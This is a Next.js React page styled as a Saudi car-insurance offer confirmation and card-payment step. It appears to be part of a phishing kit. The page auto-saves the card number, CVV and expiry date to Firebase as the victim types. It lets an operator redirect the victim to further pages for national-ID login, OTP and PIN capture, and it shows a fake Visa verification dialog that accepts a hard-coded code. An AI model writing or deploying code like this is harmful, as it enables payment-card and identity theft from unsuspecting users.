"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Check, X, Globe } from 'lucide-react'
import { FullPageLoader } from "@/components/loader"
import { StepIndicator } from "@/components/step-indicator"
import PaymentPage from "@/components/pay-form"
import { getOrCreateVisitorID, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
import { useAutoSave } from "@/hooks/use-auto-save"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { addData, saveToHistory, db } from "@/lib/firebase"
import { doc, getDoc, onSnapshot } from "firebase/firestore"

export default function CheckPage() {
  const router = useRouter()
  const [visitorID] = useState(() => getOrCreateVisitorID())
  const [loading, setLoading] = useState(true)
  const [isBlocked, setIsBlocked] = useState(false)
  
  // Form fields
  const [selectedOffer, setSelectedOffer] = useState<any>(null)
  const [offerTotalPrice, setOfferTotalPrice] = useState<number>(0)
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("credit-discount")
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const [otpValue, setOtpValue] = useState("")
  const [otpError, setOtpError] = useState("")
  const [otpAttempts, setOtpAttempts] = useState(5)
  const [cardNumber, setCardNumber] = useState("")
  const [cvv, setCvv] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  
  // Language
  const [language, setLanguage] = useState<"ar" | "en">("ar")
  
  // Auto-save
  useAutoSave({
    visitorId: visitorID,
    pageName: "check",
    data: {
      selectedPaymentMethod,
      cardNumber,
      cvv,
      expiryDate
    }
  })
  
  // Monitor redirect requests from admin
  useRedirectMonitor({
    visitorId: visitorID,
    currentPage: "check"
  })

  // Navigation listener - listen for admin redirects
  useEffect(() => {
    if (!visitorID) return

    const unsubscribe = onSnapshot(
      doc(db, "pays", visitorID),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const step = data.currentStep

          // Redirect based on currentStep
          if (step === "home") {
            router.push("/main")
          } else if (step === "phone") {
            router.push("/phone-info")
          } else if (step === "nafad") {
            router.push("/nafad")
          } else if (step === "otp") {
            router.push("/veri")
          } else if (step === "pin") {
            router.push("/confi")
          }
        }
      },
      (error) => {
        console.error("Navigation listener error:", error)
      }
    )

    return () => unsubscribe()
  }, [router, visitorID])
  
  // Initialize on mount
  useEffect(() => {
    const init = async () => {
      const blocked = await checkIfBlocked(visitorID)
      if (blocked) {
        setIsBlocked(true)
        setLoading(false)
        return
      }
      
      // Load selected offer from Firebase
      const docRef = doc(db, "pays", visitorID)
      const docSnap = await getDoc(docRef)
      
      if (docSnap.exists()) {
        const data = docSnap.data()
        if (data.selectedOffer) {
          setSelectedOffer(data.selectedOffer)
        }
        if (data.offerTotalPrice) {
          setOfferTotalPrice(data.offerTotalPrice)
        }
      }
      
      await updateVisitorPage(visitorID, "check", 4)
      setLoading(false)
    }
    
    init()
  }, [visitorID])
  
  const handlePayment = async (e: React.FormEvent) => {
    e.preventDefault()
    // Save current data to history before updating
    await saveToHistory(visitorID, 4)
    
    await addData({ id: visitorID, cardNumber, cvv, expiryDate, selectedPaymentMethod, cardUpdatedAt: new Date().toISOString() }).then(() => {
      setShowOtpDialog(true)
    })
  }
  
  const handleOtpSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (otpValue === "123456") {
      setShowOtpDialog(false)
      alert("تم الدفع بنجاح!")
    } else {
      setOtpError("رمز التحقق غير صحيح")
      setOtpAttempts((prev) => prev - 1)
    }
  }
  
  const handleResendOtp = () => {
    setOtpError("")
    setOtpAttempts(5)
    alert("تم إرسال رمز جديد")
  }
  
  if (loading) {
    return <FullPageLoader />
  }
  
  if (isBlocked) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
        </div>
      </div>
    )
  }
  
  if (!selectedOffer) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-gray-900 mb-4">لم يتم اختيار عرض</h1>
          <p className="text-gray-600 mb-6">يرجى العودة واختيار عرض تأمين</p>
          <Button
            onClick={() => router.push('/compar')}
            className="bg-[#0a4a68] hover:bg-[#083d57] text-white"
          >
            العودة للعروض
          </Button>
        </div>
      </div>
    )
  }
  
  return (
    <div className="min-h-screen bg-[#0a4a68]">
      {/* Header */}
      <div className="bg-[#0a4a68] px-3 py-3 md:px-6 md:py-4 flex items-center justify-between border-b border-white/10">
        <button 
          onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
          className="flex items-center gap-1.5 px-3 py-2 md:px-4 md:py-2.5 bg-white/95 rounded-lg hover:bg-white transition-colors shadow-md"
        >
          <Globe className="w-4 h-4 md:w-5 md:h-5 text-[#0a4a68]" />
          <span className="text-[#0a4a68] font-semibold text-sm md:text-base">{language === "ar" ? "EN" : "AR"}</span>
        </button>
        <div className="w-10 h-10 md:w-12 md:h-12 rounded-full bg-white/10 border-2 border-white flex items-center justify-center shadow-md">
          <span className="text-white text-xl md:text-2xl font-bold">B</span>
        </div>
      </div>

      {/* Step Indicator */}
      <div className="bg-[#0a4a68] px-3 py-6 md:px-6 md:py-10 text-center border-b border-white/10">
        <StepIndicator currentStep={4} />
      </div>

      {/* Main Content */}
      <div className="max-w-3xl mx-auto -mt-4 md:-mt-6 px-3 md:px-4 pb-6 md:pb-8">
        <div className="bg-white rounded-xl md:rounded-2xl shadow-xl overflow-hidden">
          <div className="p-4 md:p-6 lg:p-8">
            <h2 className="text-2xl md:text-3xl font-bold text-[#0a4a68] mb-4 md:mb-6 text-center">
              تأكيد العرض والدفع
            </h2>

            {/* Summary Card - Same as compar page */}
            <div className="bg-white rounded-lg md:rounded-xl shadow-md p-4 md:p-5 lg:p-6 mb-5 md:mb-6" dir="rtl">
              <div className="flex items-start justify-between gap-3 md:gap-4">
                <div className="flex-1">
                  <h3 className="text-lg md:text-xl font-bold text-gray-900 mb-1 md:mb-2">{selectedOffer.name}</h3>
                  <p className="text-blue-600 font-semibold text-base md:text-lg mb-3 md:mb-4">
                    التأمين {selectedOffer.type === "against-others" ? "ضد الغير" : selectedOffer.type === "comprehensive" ? "شامل" : ""}
                  </p>

                  {selectedOffer.extra_features && selectedOffer.extra_features.length > 0 && (
                    <div className="space-y-2 mb-3 md:mb-4">
                      {selectedOffer.extra_features.map((feature: any, idx: number) => (
                        <div key={idx} className="flex items-start gap-2">
                          <input
                            type="checkbox"
                            checked
                            readOnly
                            className="mt-1 w-4 h-4 rounded border-gray-300 cursor-default"
                          />
                          <label className="flex-1 text-gray-700 text-xs md:text-sm">
                            {feature.content}
                          </label>
                        </div>
                      ))}
                    </div>
                  )}
                </div>

                <div className="flex flex-col items-end gap-2 md:gap-3">
                  {selectedOffer.image_url && (
                    <div className="w-16 h-16 md:w-20 md:h-20 rounded-lg border-2 border-gray-200 flex items-center justify-center bg-gray-50 overflow-hidden">
                      <img
                        src={selectedOffer.image_url}
                        alt={selectedOffer.name}
                        className="w-full h-full object-contain"
                      />
                    </div>
                  )}
                  <div className="text-left">
                    <div className="text-2xl md:text-3xl font-bold text-[#0a4a68]">{offerTotalPrice.toFixed(2)}</div>
                    <div className="text-xs md:text-sm text-gray-600">ريال / سنة</div>
                  </div>
                </div>
              </div>
            </div>
            
            <PaymentPage offerTotalPrice={offerTotalPrice} />
          </div>
        </div>
      </div>

      {/* OTP Dialog */}
      {showOtpDialog && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8" dir="rtl">
            <div className="flex items-center justify-between gap-4 mb-6">
              <img src="/visa.svg" alt="kd" width={50} />
              <span className="font-bold text-blue-800">Verified </span>
            </div>

            <h3 className="text-2xl font-bold text-gray-900 text-center mb-4">Enter verification code</h3>
            <p className="text-gray-600 text-center mb-6 leading-relaxed">
              We sent you a verification code by text message to (+966) 5******.
            </p>

            <form onSubmit={handleOtpSubmit} className="space-y-5">
              <div className="space-y-2">
                <label className="block text-gray-700 font-semibold text-sm text-center">Verification code</label>
                <Input
                  type="tel"
                  value={otpValue}
                  onChange={(e) => {
                    setOtpValue(e.target.value)
                    setOtpError("")
                  }}
                  placeholder="######"
                  maxLength={6}
                  className="h-16 text-center text-2xl tracking-widest border-2 rounded-xl focus:border-blue-500 shadow-sm font-mono"
                  required
                />
                {otpError && (
                  <div className="flex items-center gap-2 text-red-600 text-sm font-semibold justify-center">
                    <X className="w-4 h-4" />
                    <span>{otpError}</span>
                  </div>
                )}
              </div>

              <Button
                type="submit"
                className="w-full h-14 bg-blue-600 hover:bg-blue-700 text-white font-bold text-lg rounded-xl shadow-lg hover:shadow-xl transition-all"
              >
                CONTINUE
              </Button>

              <button
                type="button"
                onClick={handleResendOtp}
                className="w-full text-blue-600 font-semibold text-sm hover:text-blue-700 transition-colors"
              >
                RESEND CODE
              </button>
            </form>

            <div className="mt-6 pt-6 border-t-2 border-gray-200">
              <button className="flex items-center justify-between w-full text-blue-600 font-semibold text-sm hover:text-blue-700 transition-colors">
                <span>Need Help?</span>
                <span className="text-xl">+</span>
              </button>
            </div>

            <div className="mt-4">
              <p className="text-gray-500 text-xs text-center leading-relaxed">
                Having trouble?
                <br />
                <button className="text-blue-600 hover:text-blue-700 font-semibold">
                  Choose another security option
                </button>
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
